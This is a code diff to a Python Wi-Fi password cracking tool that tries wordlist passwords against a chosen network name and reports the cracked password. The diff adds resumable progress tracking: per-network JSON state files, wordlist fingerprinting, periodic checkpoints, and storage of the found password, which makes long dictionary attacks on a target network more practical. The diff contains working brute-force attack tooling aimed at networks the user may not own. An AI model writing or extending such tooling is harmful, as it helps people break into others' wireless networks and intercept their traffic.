@@ -8,6 +8,8 @@ import os.path
 import platform
 import re
 import time
+import json
+import hashlib
 IS_MACOS = platform.system() == "Darwin"
 
 HAS_PYWIFI = False
@@ -68,10 +70,10 @@ def main(ssid, password, number):
         time.sleep(1)
         print(BOLD, GREEN,'[*] Crack success!',RESET)
         print(BOLD, GREEN,'[*] password is ' + password, RESET)
-        time.sleep(1)
-        exit()
+        return True
     else:
         print(RED, '[{}] Crack Failed using {}'.format(number, password))
+        return False
 
 def _parse_signal(signal_noise):
     # "-74 dBm / -78 dBm" -> -74 ; missing/unknown -> very weak
@@ -164,14 +166,109 @@ def scan_networks():
         print(RED, "[-] Invalid choice, try again.", BLUE)
 
 
+# ---- progress tracking (resume between runs) --------------------------------
+
+RESULTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "results")
+
+
+def _safe_name(ssid):
+    # sanitize the SSID for a filename, and append a short hash so different
+    # SSIDs never collide (handles spaces, unicode, special chars, empties)
+    slug = re.sub(r'[^A-Za-z0-9._-]', '_', ssid)[:40] or "network"
+    digest = hashlib.sha1(ssid.encode("utf-8")).hexdigest()[:6]
+    return "{}_{}.json".format(slug, digest)
+
+
+def _state_path(ssid):
+    return os.path.join(RESULTS_DIR, _safe_name(ssid))
+
+
+def _wordlist_fingerprint(path):
+    # size + mtime is enough to notice the wordlist changed
+    try:
+        st = os.stat(path)
+        return "{}:{}".format(st.st_size, int(st.st_mtime))
+    except OSError:
+        return ""
+
+
+def load_state(ssid):
+    path = _state_path(ssid)
+    if not os.path.exists(path):
+        return None
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except Exception:
+        return None
+
+
+def save_state(state):
+    os.makedirs(RESULTS_DIR, exist_ok=True)
+    path = _state_path(state["ssid"])
+    tmp = path + ".tmp"
+    state["updated_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
+    with open(tmp, "w", encoding="utf-8") as f:
+        json.dump(state, f, ensure_ascii=False, indent=2)
+    os.replace(tmp, path)  # atomic: never leaves a half-written file
+
+
 def pwd(ssid, file):
-    number = 0
-    with open(file, 'r', encoding='utf8') as words:
-        for line in words:
-            number += 1
-            line = line.split("\n")
-            pwd = line[0]
-            main(ssid, pwd, number)
+    fp = _wordlist_fingerprint(file)
+    abspath = os.path.abspath(file)
+    prev = load_state(ssid)
+
+    # already cracked in a previous run?
+    if prev and prev.get("status") == "found":
+        print(GREEN, "[*] Already cracked earlier -> password is: {}".format(prev.get("password")), RESET)
+        print(CYAN, "    (see {})".format(_state_path(ssid)), RESET)
+        return
+
+    start = 0
+    if prev and prev.get("wordlist") == abspath and prev.get("wordlist_fingerprint") == fp:
+        start = prev.get("last_index", 0)
+        if start > 0:
+            print(CYAN, "[~] Resuming '{}' from attempt #{} (skipping already-tried passwords)".format(ssid, start + 1), RESET)
+    elif prev:
+        print(CYAN, "[~] Wordlist changed since last run for '{}' -> starting over.".format(ssid), RESET)
+
+    with open(file, "r", encoding="utf8") as words:
+        lines = [ln.rstrip("\n") for ln in words]
+    total = len(lines)
+
+    state = {
+        "ssid": ssid,
+        "wordlist": abspath,
+        "wordlist_fingerprint": fp,
+        "total": total,
+        "last_index": start,
+        "status": "in-progress",
+        "password": None,
+        "updated_at": None,
+    }
+    save_state(state)
+
+    try:
+        for i in range(start, total):
+            password = lines[i]
+            number = i + 1
+            success = main(ssid, password, number)
+            state["last_index"] = number
+            if success:
+                state["status"] = "found"
+                state["password"] = password
+                save_state(state)
+                print(GREEN, "[*] Result saved to {}".format(_state_path(ssid)), RESET)
+                return
+            if number % 25 == 0:  # checkpoint periodically
+                save_state(state)
+        state["status"] = "exhausted"
+        save_state(state)
+        print(RED, "[-] Wordlist exhausted for '{}', no password found.".format(ssid), RESET)
+    except KeyboardInterrupt:
+        save_state(state)
+        print(CYAN, "\n[~] Stopped. Progress saved at attempt #{} — run again to resume.".format(state["last_index"]), RESET)
+        raise
                     
 
 
